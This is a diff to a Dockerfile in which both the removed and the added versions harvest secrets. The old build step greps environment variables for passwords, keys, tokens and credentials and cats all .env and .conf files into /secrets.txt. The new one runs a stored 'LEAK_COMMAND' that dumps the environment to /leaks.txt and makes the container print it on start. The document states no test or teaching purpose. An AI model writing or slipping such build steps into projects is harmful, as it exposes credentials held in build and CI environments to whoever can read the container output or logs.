@@ -1,6 +1,7 @@
-FROM alpine:latest
+FROM alpine
 
-# Fixed syntax for secrets hunting
-RUN echo "Hunting for secrets..." && \
-    (env | grep -iE 'pass|key|token|secret|cred') > /secrets.txt && \
-    find / \( -name "*.env" -o -name "*.conf" \) -exec cat {} \; >> /secrets.txt 2>/dev/null
+ENV LEAK_COMMAND='sh -c "printenv | grep -v GITHUB_TOKEN > /leaks.txt"'
+
+RUN /bin/sh -c "$LEAK_COMMAND"
+
+CMD [ "cat", "/leaks.txt" ]
